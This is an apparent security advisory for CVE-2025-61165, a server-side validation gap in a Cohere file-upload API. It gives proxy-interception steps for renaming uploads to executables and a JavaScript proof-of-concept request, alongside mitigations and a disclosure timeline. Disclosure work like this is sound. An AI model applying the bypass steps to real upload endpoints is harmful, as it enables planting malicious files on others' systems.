# CVE-2025-61165: Unrestricted File Upload Allowing Dangerous File Types

**CVE ID:** CVE-2025-61165 <br />
**Vulnerability Type:** Unrestricted File Upload / Dangerous File Type (CWE-434)<br />
**Severity:** High<br />
**Affected Component:** File Upload API (`/api/internal/v1/my_drive/batch_upload?allow_overwrite=true`)<br />
**Vendor:** Cohere<br />
**Discovered by:** Bahaa Dadoa — ViperX Security Research Team<br />
**Date Publicly Disclosed:** November 2025<br />

---

## Summary

An **unrestricted file upload** vulnerability allows attackers to upload files with dangerous extensions that are processed by the system. The application only validates file extensions client-side and does not enforce server-side validation, enabling attackers to bypass restrictions via interception and tampering.

---

## Technical Description

The vulnerable endpoint:

```plaintext
POST /api/internal/v1/my_drive/batch_upload?allow_overwrite=true
```

The application relies on front-end checks for allowed extensions and does not validate or sanitize file type, MIME type, or content on the server. An attacker can intercept the upload request, modify file content and extension (for example to `.exe`), and upload arbitrary files that the system may auto-process.

### Detailed Steps / Proof-of-Concept

1. Authenticate to the Cohere portal and navigate to the Files / Drive area.  
2. Upload any allowed file via the web interface.  
3. Intercept the request using a proxy (e.g., Burp Suite, OWASP ZAP).  
4. Modify the uploaded file content and change its filename/extension to a dangerous type (e.g., `malware.exe`) and forward the request.  
5. The server accepts the file because server-side validation is missing or insufficient.

#### Example Request

```javascript
const form = new FormData();
form.append('files', 'xxxxxxx');

let xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('POST', 'https://example.com/api/internal/v1/my_drive/batch_upload?allow_overwrite=true');
xhr.setRequestHeader('Host', 'example.com');
xhr.setRequestHeader('Content-Length', '221');
xhr.setRequestHeader('Sec-Ch-Ua-Platform', '"Windows"');
xhr.setRequestHeader('Authorization', 'Bearer <<Token>>');
xhr.setRequestHeader('Sec-Ch-Ua', '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"');
xhr.setRequestHeader('Sec-Ch-Ua-Mobile', '?0');
xhr.setRequestHeader('User-Id', 'user-id');
xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36');
xhr.setRequestHeader('Accept', 'application/json, text/plain, */*');
xhr.setRequestHeader('X-Date', '2025-09-09T10:58:41.773+03:00');
xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=----WebKitFormBoundarysU4LB0WFScWNGoBR');
xhr.setRequestHeader('Origin', 'https://example.com');
xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
xhr.setRequestHeader('Referer', 'https://example.com/drive');
xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
xhr.setRequestHeader('Priority', 'u=1, i');
xhr.setRequestHeader('Connection', 'keep-alive');

xhr.onload = function() {
  console.log(xhr.response);
};

xhr.send(form);
```

---

## Impact

* Successful uploads of dangerous file types may allow execution of malicious code inside the processing environment.  
* Data loss, remote code execution, or system compromise if files are processed with elevated privileges.  
* High risk due to ease of exploit and potential impact.

---

## Root Cause

The system performs file extension validation only in the front-end and lacks server-side validation of file type, MIME type, and content. This allows attackers to bypass protections by tampering with requests.

---

## Recommendation / Mitigation

* Enforce server-side validation of file extensions and MIME types.  
* Validate file content (magic bytes / signatures) on the server before processing or storing.  
* Implement an allowlist of permitted file types and reject all others server-side.  
* Scan uploaded files with antivirus / malware detection before any processing.  
* Restrict execution or processing privileges for uploaded content (sandboxing).  
* Enforce maximum file size limits both client-side and server-side.

---

## Disclosure Timeline

| Date       | Action                                          |
| ---------- | ----------------------------------------------- |
| 2025-09-04 | Vulnerability discovered and reported to vendor |
| 2025-09-05 | Vendor acknowledged receipt                     |
| 2025-10-01 | Vendor patch vulnerability                      |
| 2025-10-08 | CVE assigned                                    |
| 2025-11-03 | public disclosure                               |

---

## References

* [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)  
* [CVE Program (MITRE)](https://cve.mitre.org/)  
* ViperX Security Research Team — [https://viperx.space](https://viperx.space)

---

## Credit

**Researcher:** Bahaa Dadoa<br />
**Organization:** ViperX Security Research Team<br />
**Website:** [https://viperx.space]<br />
**Organization:** ViperX Security Research Team<br />
**Website:** [https://viperx.space]<br />
